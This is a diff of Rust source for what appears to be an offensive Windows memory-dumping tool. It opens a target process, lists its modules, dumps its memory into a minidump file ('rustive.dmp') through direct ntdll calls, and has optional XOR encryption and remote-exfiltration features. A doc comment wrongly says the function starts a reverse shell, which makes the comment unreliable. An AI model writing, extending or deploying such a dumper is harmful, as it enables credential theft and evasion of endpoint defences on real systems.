@@ -2,35 +2,46 @@
 #![no_main]
 
 extern crate alloc;
+extern crate panic_halt;
+
 use core::ptr::null_mut;
-
-mod common;
-mod dump;
-mod helper;
-mod mdfile;
-mod ntapi;
-
-#[cfg(feature = "remote")]
-mod remote;
-
+use dumper::mdfile::generate_memory_dump_file;
 use helper::{
     get_process_handle, handle_output_file, initialize_privileges, perform_memory_dump,
     retrieve_modules,
 };
-use mdfile::generate_memory_dump_file;
-use ntapi::{allocator::NtVirtualAlloc, def::OSVersionInfo, utils::rtl_get_version};
+use instance::get_instance;
+use native::ntdef::OSVersionInfo;
 
-#[cfg(feature = "verbose")]
-use libc_print::libc_println;
+use crate::native::ntpsapi::rtl_get_version;
+
+mod common;
+mod dumper;
+mod helper;
+mod instance;
+mod native;
+mod premain;
+
+#[cfg(feature = "debug")]
+mod debug;
 
 #[cfg(feature = "xor")]
-use crate::common::xor::xor_bytes;
+mod encrypt;
+
+#[cfg(feature = "xor")]
+use encrypt::xor::xor_bytes;
+
+#[cfg(feature = "remote")]
+mod remote;
+
+// Set a custom global allocator
+use crate::native::allocator::NtVirtualAlloc;
 
 #[global_allocator]
 static GLOBAL: NtVirtualAlloc = NtVirtualAlloc;
 
-#[no_mangle]
-pub extern "C" fn _start() {
+/// Initializes system modules and functions, and then starts a reverse shell.
+pub unsafe fn dumpit() {
     #[cfg(not(feature = "remote"))]
     let output_file_name = "rustive.dmp";
 
@@ -53,11 +64,13 @@ pub extern "C" fn _start() {
         debug_println!("[-] Failed to retrieve process handle. Exiting!");
         return;
     }
-    debug_println!("[+] Process handle: {:?}", process_handle);
+
+    debug_println!("[+] Process handle: ", process_handle as usize, true);
 
     // Retrieve the list of loaded modules in the target process.
     let mut module_info_list = retrieve_modules(process_handle);
     if module_info_list.is_empty() {
+        unsafe { get_instance().unwrap().ntdll.nt_close.run(process_handle) };
         debug_println!("[-] No modules found. Exiting!");
         return;
     }
@@ -65,12 +78,14 @@ pub extern "C" fn _start() {
     // Dumps the memory regions of the target process.
     let (memory64list, memory_regions) = perform_memory_dump(process_handle, &mut module_info_list);
 
+    unsafe { get_instance().unwrap().ntdll.nt_close.run(process_handle) };
+
     // Retrieve OS version information.
     let mut version_info = OSVersionInfo::new();
     let status = unsafe { rtl_get_version(&mut version_info) };
     if status != 0 {
         debug_println!(
-            "[-] Failed to retrieve OS Version from PEB. NTSTATUS: 0x{:X}",
+            "[-] Failed to retrieve OS Version from PEB with status: ",
             status
         );
     }
@@ -96,13 +111,4 @@ pub extern "C" fn _start() {
 
     #[cfg(not(feature = "remote"))]
     handle_output_file(file_bytes_to_use, output_file_name);
-}
-
-#[cfg(not(test))]
-use core::panic::PanicInfo;
-
-#[cfg(not(test))]
-#[panic_handler]
-fn panic(_info: &PanicInfo) -> ! {
-    loop {}
 }
